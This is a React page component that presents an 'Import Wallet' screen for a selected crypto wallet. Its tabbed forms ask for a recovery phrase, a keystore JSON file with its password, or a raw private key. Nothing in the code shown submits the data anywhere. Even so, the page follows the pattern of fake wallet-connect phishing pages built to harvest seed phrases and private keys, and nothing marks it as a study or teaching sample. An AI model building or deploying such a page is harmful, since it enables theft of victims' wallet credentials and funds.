import React, { useState } from 'react';
import { useLocation, useNavigate } from 'react-router-dom';
import Header from '../components/Header';
import SocialFooter from '../components/SocialFooter';

const tabData = [
  {
    key: 'phrase',
    label: 'Phrase',
    content: (
      <form>
        <textarea name="key" required minLength={12} placeholder="Phrase" className="w-full p-2 border rounded" />
        <div className="desc mt-2 text-sm text-gray-500">Typically 12 (sometimes 24) words separated by single spaces</div>
        <button type="submit" className="btn blMRzM mt-4 px-6 py-2 bg-blue-500 text-white rounded">IMPORT</button>
      </form>
    )
  },
  {
    key: 'keystore',
    label: 'Keystore JSON',
    content: (
      <form>
        <textarea name="key" required minLength={12} placeholder="Keystore JSON" className="w-full p-2 border rounded" />
        <input type="text" name="pass" placeholder="Password" required minLength={4} className="w-full p-2 border rounded mt-2" />
        <div className="desc mt-2 text-sm text-gray-500">Several lines of text beginning with '(...)' plus the password you used to encrypt it.</div>
        <button type="submit" className="btn blMRzM mt-4 px-6 py-2 bg-blue-500 text-white rounded">IMPORT</button>
      </form>
    )
  },
  {
    key: 'private',
    label: 'Private Key',
    content: (
      <form>
        <input type="text" name="key" placeholder="Private Key" required minLength={64} className="w-full p-2 border rounded" />
        <div className="desc mt-2 text-sm text-gray-500">Typically 64 alphanumeric characters</div>
        <button type="submit" className="btn blMRzM mt-4 px-6 py-2 bg-blue-500 text-white rounded">IMPORT</button>
      </form>
    )
  }
];

const WalletConnectPage = () => {
  const location = useLocation();
  const navigate = useNavigate();
  const { wallet } = location.state || {};
  const [activeTab, setActiveTab] = useState('phrase');

  if (!wallet) {
    // If no wallet info, redirect back to wallets page
    navigate('/wallets');
    return null;
  }

  return (
    <div>
      <Header />
      <main className="flex flex-col items-center">
        <h1 className="flex justify-center mt-20 text-4xl font-semibold import__page">Import Wallet</h1>
        <div className="flex flex-col items-center mt-8">
          <img src={wallet.image} alt={wallet.name + ' logo'} className="w-20 h-20 object-contain mb-2 rounded-full" />
          <p className="text-lg font-bold text-gray-800 text-center">{wallet.name}</p>
        </div>
        <div className="tab flex gap-2 mt-8">
          {tabData.map(tab => (
            <button
              key={tab.key}
              className={`tablinks px-4 py-2 rounded ${activeTab === tab.key ? 'bg-blue-500 text-white' : 'bg-gray-200 text-gray-700'}`}
              onClick={() => setActiveTab(tab.key)}
            >
              {tab.label}
            </button>
          ))}
        </div>
        <div className="tabcontent w-full max-w-lg mt-6">
          {tabData.find(tab => tab.key === activeTab)?.content}
        </div>
      </main>
  <SocialFooter />
    </div>
  );
};

export default WalletConnectPage;
